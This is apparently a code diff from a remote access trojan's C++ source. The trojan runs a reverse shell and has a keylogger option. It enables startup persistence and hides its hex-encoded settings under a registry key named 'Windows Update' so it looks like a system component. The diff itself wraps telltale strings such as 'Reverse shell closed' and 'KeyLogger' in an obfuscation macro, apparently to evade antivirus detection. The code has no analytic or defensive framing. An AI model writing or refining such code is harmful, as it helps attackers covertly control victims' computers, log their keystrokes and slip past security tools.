@@ -110,7 +110,7 @@ public:
 		if (!TcpIP::SendString(Sock, Res))
 			return "";
 		
-		if (Res != "Reverse shell closed")
+		if (Res != (string)AY_OBFUSCATE("Reverse shell closed"))
 			if (!TcpIP::RecvString(Sock, Buff))
 				return "";
 
@@ -157,7 +157,7 @@ public:
 		InstallPath = sf.GetSetting("InstallPath");
 		ExeName = sf.GetSetting("ExeName");
 		RegStartup = (sf.GetSetting("RegStartup") == "true");
-		KeyLogger = (sf.GetSetting("KeyLogger") == "true");
+		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");
 
 		/*Host = "127.0.0.1";
 		Porta = 6969;
@@ -176,7 +176,7 @@ public:
 		Porta = stoi(en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ)));
 		ExeName = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ));
 		RegStartup = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ)) == "true");
-		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ)) == "true");
+		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")).c_str(), REG_SZ)) == "true");
 		InstallDate = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ));
 	}
 
@@ -191,7 +191,7 @@ public:
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ, en.AsciiToHex(to_string(Porta)).c_str());
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ, en.AsciiToHex(ExeName).c_str());
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ, en.AsciiToHex((RegStartup) ? "true" : "false").c_str());
-		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")).c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
 		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate").c_str(), REG_SZ, en.AsciiToHex(DateTime::GetDateTime('_', '/')).c_str());
 	}
 };
